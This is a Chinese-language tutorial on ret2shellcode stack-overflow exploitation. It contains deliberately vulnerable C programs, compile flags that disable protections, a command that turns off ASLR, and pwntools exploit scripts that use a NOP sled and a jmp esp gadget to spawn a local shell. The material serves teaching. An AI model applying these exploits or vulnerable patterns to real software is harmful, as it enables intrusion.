## 0x00 ret2shellcode简介

 **ret2shellcode，也就是return to shellcode，在执行完某个函数之后，跳到shellcode上，达到get
shell的目的。**

ret2shellcode关键在于我们找到一个可读可写可执行的缓冲区，接下来把我们的shellcode放到这个缓冲区，然后跳转到我们的shellcode处执行
。

## 0x01 示例一

先看一个存在栈溢出的c语言程序

    
    
    #include 
    #include 
    char str1[0x40];
    void func()
    {
                char str[0x40];
                read(0,str,0x60);
                strcpy(str1,str);
    }
    int main()
    {
                func();
                return 0;
    }
    
    

我们可以看到这个程序，str1就是我们找到的那段可读可写可执行的缓冲区，那我们可以写一段shellcode放到str1中，在发生溢出时把返回地址写成str1的地址，那就会执行shellcode。

### 进行编译

    
    
    gcc -no-pie -fno-stack-protector -z execstack -m32 -o 6.exe 6.c

注释：

> -no-pie：关闭地址随机化
>
> -fno-stack-protector：没有堆栈保护
>
> -z execstack：堆栈可执行
>
> -m32: 32位

编译完成之后，顺便 checksec 6.exe，接下来查看一下保护机制，

![](https://image.3001.net/images/20200419/1587303538_5e9c5472745c5.png!small)

### 定位溢出点

在func处加个断点，cyclic 200，生成100个随机字符，继续r

![](https://image.3001.net/images/20200419/1587304481_5e9c58217f047.png!small)

继续执行之后，将上面生成的字符串复制进去

![](https://image.3001.net/images/20200419/1587304486_5e9c5826a96f4.png!small)

再利用cyclic -l taaa ,最终确定溢出点的位置为76

### 找到str1的首地址

多次单步执行 n ，就可以找到str1的首地址为0x804c060

![](https://image.3001.net/images/20200419/1587305276_5e9c5b3cc6b04.png!small)

### 生成shellcode的方法

方法1：用pwntool或者peda和msfpc或者msfvenom工具生成，支持上线，最好越短越好

例如用pwntool中的shellcraft.sh(),再转汇编字节码asm()，也就是asm(shellcraft.sh())，本例中的exp就使用了这个

方法2：手写,其实网上一搜到处都是，可以直接用，但自己要在windows里面自己调试提取
，就是想办法调用evecve("/bin/sh",null,null);

### 写exp

    
    
    from pwn import *
    context(arch="i386",os="linux")
    p=process('./6.exe')
    offset = 76
    shellcode=asm(shellcraft.sh())
    payload =shellcode.ljust(offset,'\x90')+p32(0x804c060)
    p.sendline(payload)
    p.interactive()  
    

可以单独看一下payload的写法，因为shellcode的长度不足以达到76，所以剩余的部分用\x90代替，制造一段nop导轨，直接滑到shellcode上去执行

运行一下，get shell！

![](https://image.3001.net/images/20200419/1587305669_5e9c5cc50928f.png!small)

## 0x02 用jmp esp构造payload

先看c语言程序：

    
    
    #include <stdio.h>
    #include <string.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    void exploit()
    {
        system("/bin/sh");
    }
    void func()
    {
            char str1[0x40];
            read(0,str1,0x80);  
    }
    int main()
    {
            func();
            return 0;
    }
      
    

大致思路：可以发现在read函数这里会发生溢出，并且代码里有system（"/bin/sh"），那我们让返回地址恰好是system（"/bin/sh"）的地址，就能利用这个溢出

先echo 0
>/proc/sys/kernel/randomize_va_space，关闭内存地址随机化机制，为了保证system（"/bin/sh"）在内存中的地址不发生改变

然后按照与 示例一 一样的方法进行编译，然后start

定位溢出点的方法也一样，可以得到溢出点的位置是76

![](https://image.3001.net/images/20200420/1587337653_5e9cd9b50c849.png!small)

接下来找 jmp esp的地址，在peda下输入下面的命令：

    
    
    asmsearch "jmp esp"  
    

找到一个jmp esp的地址

![](https://image.3001.net/images/20200419/1587306679_5e9c60b769924.png!small)

写exp

    
    
    from pwn import *
    context(arch="i386",os="linux")
    p=process('./8.exe')
    offset = 76
    shellcode=asm(shellcraft.sh())   
    add_jmpesp=p32(0x080b001f)            //找到的jmp esp的地址
    payload ='\x90'*offset+add_jmpesp+shellcode     
    p.sendline(payload)
    p.interactive()  
    

可以看到我们在构造payload的时候并没有直接到shellcode上去，而是先去执行jmp
esp，而此时栈顶恰好就是shellcode的首地址，也就是说执行完jmp
esp，再去执行shellocde，这是一种动态定位的方法。如下图，成功运行并get shell！

![](https://image.3001.net/images/20200419/1587307827_5e9c653361fb3.png!small)

## 0x03 总结

1.本文主要描述了ret2shellcode的相关原理和实例，关键的一点还在于我们找到一个可读可写可执行的缓冲区，接下来把我们的shellcode放到这个缓冲区，然后跳转到我们的shellcode上执行

2.两种生成shellcode的方法：

> （1）用pwntool或者peda和msfpc或者msfvenom工具生成
>
> （2）自己手写或从网上copy

3.可以用jmp esp构造payload，动态定位shellcode的地址

路虽远，行则至！今天终于在安全主流媒体上发表文章，勇敢的迈出了第一步，信安小白投的第一篇文章献丑了，若有不足之处还请各位大牛多多指出！

 ***本文作者：h778890，转载请注明来自FreeBuf.COM**

